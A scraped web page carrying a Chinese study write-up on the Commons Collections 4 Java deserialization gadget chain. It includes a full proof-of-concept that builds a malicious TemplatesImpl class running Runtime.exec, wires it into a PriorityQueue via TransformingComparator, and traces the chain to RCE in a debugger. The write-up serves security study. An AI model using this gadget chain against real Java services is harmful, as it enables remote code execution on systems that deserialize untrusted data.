@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://clashxpro.github.io/news/article-28682.htm" />
+    <meta name="theme-color" content="#c70039">
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CommonsCollection4反序列化链学习</title>
+        <meta name="description" content="1、前置知识 由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取temp" />
+        <link rel="icon" href="/assets/website/img/clashxpro/favicon.ico" type="image/x-icon"/>
+    <!-- Start Stylesheet -->
+    <link href="/assets/website/css/clashxpro/bootstrap.min.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/font-awesome.min.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/flaticon-set.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/magnific-popup.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/owl.carousel.min.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/owl.theme.default.min.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/animate.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/bootsnav.css" rel="stylesheet" />
+    <link href="/assets/website/css/clashxpro/style.css" rel="stylesheet">
+    <link href="/assets/website/css/clashxpro/responsive.css" rel="stylesheet" />
+    <!-- Google Web Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700,800" rel="stylesheet">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W0EDBJFLX5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W0EDBJFLX5');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+        <!-- Header -->
+    <header id="home">
+        <!-- Start Navigation -->
+        <nav class="navbar navbar-default navbar-fixed white no-background bootsnav">
+            <div class="container">
+                <!-- Start Header Navigation -->
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-menu"> <i class="fa fa-bars"></i> </button>
+                    <a class="navbar-brand" href="/">
+                                                <span>ClashX Pro</span>
+                                            </a>
+                </div>
+                <!-- End Header Navigation -->
+                <div class="collapse navbar-collapse" id="navbar-menu">
+                    <ul class="nav navbar-nav navbar-right" data-in="#" data-out="#">
+                                                <li><a href="/">首页</a></li>
+                                                <li><a href="/free-nodes/">免费节点</a></li>
+                                                <li><a href="/paid-subscribe/">推荐机场</a></li>
+                                                <li><a href="/news/">新闻资讯</a></li>
+                                                <li><a href="#">关于</a></li>
+                        <li><a href="#">联系</a></li>
+                    </ul>
+                </div>
+                <!-- /.navbar-collapse -->
+            </div>
+        </nav>
+        <!-- End Navigation -->
+    </header>
+    <!-- End Header -->
+    <!-- Start Page Heading -->
+    <div class="utf-page-heading shadow dark bg-fixed text-light" style="background-image: url(assets/img/banner/breadcrum.jpg);">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <h1>CommonsCollection4反序列化链学习</h1>
+                    <div class="utf-breadcrumb-items">
+                        <ul class="breadcrumb">
+                            <li><a href="/">首页</a></li>
+                            <li><a href="/news/">新闻资讯</a></li>
+                            <li class="active">正文</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End Page Heading -->
+    <!-- Start Portfolio -->
+    <div id="portfolio" class="utf-portfolio-area-item default-padding">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="Clash Meta免费节点订阅站" data-url="https://clash-meta.github.io">
+                  				  				  				</h1> <h2 id="1前置知识">1、前置知识</h2> <p>由于cc4没有新的知识点，主要是用cc2，然后稍微cc3结合了，所以我们可以看ysoserial源码，自己尝试构造一下，把cc2通过获取InvokeTransformer()获取templatesImpl的newtransformer()方法，改成用cc3的InstantiateTransformer初始化。那就把跟cc2不同的代码学习下。</p> <h3 id="11transformingcomparator">1.1、transformingComparator</h3> <p>与cc2最大的不容就是transformingComparator的构造方式不同，这里是通过获取InstantiateTransformer实例化TrAXFilter并且把templatesImpl恶意类传入，其实就是<strong>InstantiateTransformer(templateImpl).transform(TrAXFilter)</strong>。而且这就是cc3所用的方式，所以cc3在cc4占很少的部分，主要还是cc2</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{         new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter         new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform  }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers  TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);</code></pre> <h2 id="2poc分析">2、PoC分析</h2> <h3 id="21poc">2.1、Poc</h3> <pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer;  import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue;  public class CommonsCollection4 {       public static void main(String[] args) throws Exception {         String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";         String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";          ClassPool classPool=ClassPool.getDefault();//返回默认的类池         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径         CtClass payload=classPool.makeClass("com/akkacloud/CommonsCollection2Test");//创建一个新的public类         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet         payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");"); //创建一个空的类初始化，设置构造函数主体为runtime          //payload.writeFile("/Users/akka/Documents/study/JAVA-project/ysoserial/CommonsColection2/src/main/java");         byte[] bytes=payload.toBytecode();//转换为byte数组         //String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";         Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl         Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段         field.setAccessible(true);//暴力反射         field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组          Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段         field1.setAccessible(true);//暴力反射         field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test  /*        Method getTransletName = templatesImpl.getClass().getDeclaredMethod("getTransletName", new Class[]{});         getTransletName.setAccessible(true);         Object name = getTransletName.invoke(templatesImpl, new Object[]{});         System.out.println(name.toString());          Method getTransletBytecodes = templatesImpl.getClass().getDeclaredMethod("getTransletBytecodes", new Class[]{});         getTransletBytecodes.setAccessible(true);         byte[][] bytes1 = (byte[][]) getTransletBytecodes.invoke(templatesImpl, new Object[]{});         for (int i = 0; i &lt; bytes1.length; i++) {             System.out.println(bytes1.length);             System.out.println(Arrays.toString(bytes1[i]));         }*/          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(TrAXFilter.class),//第一个获取TrAXFilter                 new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})//通过InstantiateTransformer的构造方法传入我们的恶意类templatesImpl，调用其transform方法，实例化传入的TrAXFilter，调用其构造方法。再调用newTransform          };         ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);//新建一个ChainedTransformer类，传入我们的恶意transformers,只要调用transform方法就会反射执行我们的传入的恶意传入我们的恶意transformers          TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);          PriorityQueue priorityQueue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。         priorityQueue.add(1);//添加数字1插入此优先级队列         priorityQueue.add(1);//添加数字1插入此优先级队列          Field field2=priorityQueue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段         field2.setAccessible(true);//暴力反射         field2.set(priorityQueue,transformingComparator);//设置priorityQueue的comparator属性值为transformingComparator          ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         outputStream.writeObject(priorityQueue);         outputStream.close();          ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.ser"));         inputStream.readObject();         } }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/84a594027e9869bd4059b17a5abf6574.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="22poc调试">2.2、poc调试</h3> <p>在PriorityQueue的readObject打断点，发现队列内就是两个数字，进入heapify()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/0c056ce0e551c67eae8cc5f86937115b.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>因为在poc中我们没对queue字段赋值，所以queue里面就是两个数字，继续跟入siteDown()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/9dcbfaaac19dc31ccb8a49629f6f4241.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现x就是queue为空，与cc2此时的x为templatImpl，继续进入siftDownUsingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/75c08ec62d1dc7ac4c4c73302db5e27c.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现，通过comparator.compare(),这个comparator就是我们的恶意TransformingComparator</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/613ef9ebb1aacc142addfa63488c4ad4.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入发现TransformingComparator的compare方法里，用this.transformer调用了transform方法，此时的this.transformer是我们传入的ChainedTransformer，链式调用transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4fb2106781139889ca028ec6f4a797a.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入后看到第一个是ConstantTransformer，继续跟进transform方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/6bdc85e64e6354ba55e91a49759e3526.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>返回我们一开始构造的TrAXFilter.class</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7794999994be7591e23690cbaead6a11.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>第二遍是进入InstantiateTransformer ，object为我们上次循环获取TrAXFilter.class.继续跟进transform()</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5d60e424dc99179ffebd52658e78d527.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>这个transform就是实例化传入的object既TrAXFilter，而且传入的参数值为我们一起开始创建的恶意加载字节类TransformerImpl</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3cc72a1ebab4ecb8231b191dad0f7eb6.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入TrAXFilter的构造方法，传入的TransformerImpl被赋值给了templates，templates调用newTransformer方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4053a6d56747f82c3fbfca71f953de89.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>TransformerImpl的newTransformer方法，会调用本类的getTransletInstance方法，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/dc40946cbc03f89b8931759229136802.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>发现会继续调用defineTransletClasses()，继续跟进</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/09c72b1c7ea2b97aaf03a40edd4c4ded.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>进入defineTransletClasses方法后发现，会把我们前面构造的_bytecodes[i]传输给_class[i],饭后返回到getTransletInstance方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7fea6927a613b9eccd7b8c02145e97b9.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>然后在getTransletInstance方法后，实例化我们传入的_class[i]恶意类<mark>》TemplatesImpl</mark>》CommonsCollection2Test.</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/89b07006097f1bc7ced2773721289386.jpg" alt="CommonsCollection4反序列化链学习"></p> <p>实例化就会调用我们一开始设置的静态代码块，造成RCE</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/e4f8b70a95347430a5b2ae087167ee6f.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="23利用链">2.3、利用链</h3> <pre><code class="language-java">Gadget chain: 		ObjectInputStream.readObject() 			PriorityQueue.readObject()         PriorityQueue.heapify()           PriorityQueue.siftDown()             PriorityQueue.siftDownUsingComparator()               ...                 TransformingComparator.compare()                   InstantiateTransformer.transform()                     Method.invoke()                       Runtime.exec()</code></pre> <h3 id="24思维导图">2.4、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4520c68ba4af81158b42d55f39d15b37.jpg" alt="CommonsCollection4反序列化链学习"></p> <h3 id="25结束">2.5、结束</h3> <p>cc4链还是比较简单，我继续每一步调试的原因就是可以更好的复习前面学习的链，我cc2和cc4用的是commonscollection4依赖版本才成功，cc1、cc3和cc5是用的jdk8u66才成功的</p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-28231.htm">动物防疫站几点关门 动物防疫站几点关门啊</a></p>
+                                        <p>下一个：<a href="/news/article-28685.htm">【宠物狗免费领养】（宠物狗免费领养真的假的）</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-21286.htm" title="React中事件的写法总结">React中事件的写法总结</a></li>
+                        <li class="py-2"><a href="/news/article-23123.htm" title="动物医院贵吗多少钱一个（动物医院价格）">动物医院贵吗多少钱一个（动物医院价格）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-12-free-node-subscribe.htm" title="ClashX Pro节点订阅每天更新22M/S免费节点订阅链接">ClashX Pro节点订阅每天更新22M/S免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-24441.htm" title="动物疫苗接种时间要求是什么意思呢（动物疫苗注射的作用）">动物疫苗接种时间要求是什么意思呢（动物疫苗注射的作用）</a></li>
+                        <li class="py-2"><a href="/news/article-27751.htm" title="Spring Security核心组件之安全上下文">Spring Security核心组件之安全上下文</a></li>
+                        <li class="py-2"><a href="/news/article-21771.htm" title="成都宠物领养平台电话号码是多少（成都宠物领养平台电话号码是多少号）">成都宠物领养平台电话号码是多少（成都宠物领养平台电话号码是多少号）</a></li>
+                        <li class="py-2"><a href="/news/article-21770.htm" title="宠物粮食制作（宠物粮食制作教程）">宠物粮食制作（宠物粮食制作教程）</a></li>
+                        <li class="py-2"><a href="/news/article-28229.htm" title="PDCA循环——快速提升软件质量的必备工具">PDCA循环——快速提升软件质量的必备工具</a></li>
+                        <li class="py-2"><a href="/news/article-19453.htm" title="狗狗领养协议图片高清（狗狗领养协议怎么写）">狗狗领养协议图片高清（狗狗领养协议怎么写）</a></li>
+                        <li class="py-2"><a href="/news/article-19916.htm" title="流浪猫养多久才不会跑（流浪猫养多久才不会跑来跑去）">流浪猫养多久才不会跑（流浪猫养多久才不会跑来跑去）</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">60</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">28</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End Portfolio -->
+        <!-- Start Footer -->
+    <footer class="text-center bg-dark text-light">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 copyright text-left">
+                    <p>
+                        <a href="/">首页</a> | 
+                        <a href="/free-node/">免费节点</a> | 
+                        <a href="/news/">新闻资讯</a> |
+                        <a href="/about-us.htm">关于我们</a> |
+                        <a href="/disclaimer.htm">免责申明</a> |
+                        <a href="/privacy.htm">隐私申明</a> |
+                        <a href="/sitemap.xml">网站地图</a>
+                    </p>
+                    <p>
+                        <a href="/">ClashX Pro免费机场订阅节点官网</a> 版权所有 Powered by WordPress
+                    </p>
+                </div>
+                <div class="col-md-4 utf-footer-social text-right">
+                    <ul>
+                        <li class="facebook"><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                        <li class="linkedin"><a href="#"><i class="fab fa-linkedin"></i></a></li>
+                        <li class="twitter"><a href="#"><i class="fab fa-twitter"></i></a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- jQuery Style -->
+    <script src="/assets/website/js/frontend/clashxpro/jquery-3.2.1.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/bootstrap.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/equal-height.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/jquery.appear.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/jquery.easing.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/jquery.magnific-popup.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/modernizr.custom.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/owl.carousel.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/isotope.pkgd.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/imagesloaded.pkgd.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/count-to.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/bootsnav.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/typed.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/YTPlayer.min.js"></script>
+    <script src="/assets/website/js/frontend/clashxpro/custom_script.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
